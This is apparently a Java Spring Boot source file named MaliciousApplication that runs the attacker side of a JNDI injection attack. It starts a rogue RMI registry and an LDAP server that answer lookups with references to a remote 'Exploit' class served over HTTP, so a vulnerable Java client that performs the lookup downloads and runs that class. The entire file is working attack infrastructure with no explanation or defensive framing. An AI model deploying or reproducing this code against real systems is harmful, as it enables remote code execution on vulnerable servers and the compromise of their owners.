package com.kossatzd;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

@SpringBootApplication
public class MaliciousApplication {

	public static void main(String[] args) throws Exception {
		SpringApplication.run(MaliciousApplication.class, args);

		setupRMI(1099, "localhost", 8888);

		setupLDAP(389, "localhost", 8888);
	}

	public static void setupRMI(Integer rmiPort, String remoteClassServerHost, Integer remoteClassServerPort) throws Exception {

		Registry registry = LocateRegistry.createRegistry(rmiPort);

		Reference ref = new Reference("Exploit", "Exploit", "http://" + remoteClassServerHost + ":" + remoteClassServerPort + "/");

		ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

		registry.bind("Exploit", referenceWrapper);
	}

	public static void setupLDAP(Integer ldapPort, String remoteClassServerHost, Integer remoteClassServerPort) throws Exception {
		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");

			config.setListenerConfigs(new InMemoryListenerConfig(
					"listen",
					InetAddress.getByName("0.0.0.0"),
					ldapPort,
					ServerSocketFactory.getDefault(),
					SocketFactory.getDefault(),
					(SSLSocketFactory) SSLSocketFactory.getDefault()));

			config.addInMemoryOperationInterceptor(
					new OperationInterceptor(new URL("http://" + remoteClassServerHost + ":" + remoteClassServerPort + "/#Exploit")));

			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
			ds.startListening();

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static class OperationInterceptor extends InMemoryOperationInterceptor {

		private URL codebase;

		public OperationInterceptor(URL cb) {
			this.codebase = cb;
		}

		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base = result.getRequest().getBaseDN();
			Entry e = new Entry(base);
			try {
				sendResult(result, base, e);
			} catch (Exception e1) {
				e1.printStackTrace();
			}

		}

		protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
			URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));

			System.out.println("Sending LDAP for " + base + ". Redirecting to " + turl);

			e.addAttribute("javaClassName", "Exploit");
			String cbstring = this.codebase.toString();
			int refPos = cbstring.indexOf('#');
			if (refPos > 0) {
				cbstring = cbstring.substring(0, refPos);
			}

			e.addAttribute("javaCodeBase", cbstring);
			e.addAttribute("objectClass", "javaNamingReference");
			e.addAttribute("javaFactory", this.codebase.getRef());


			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}

	}

}
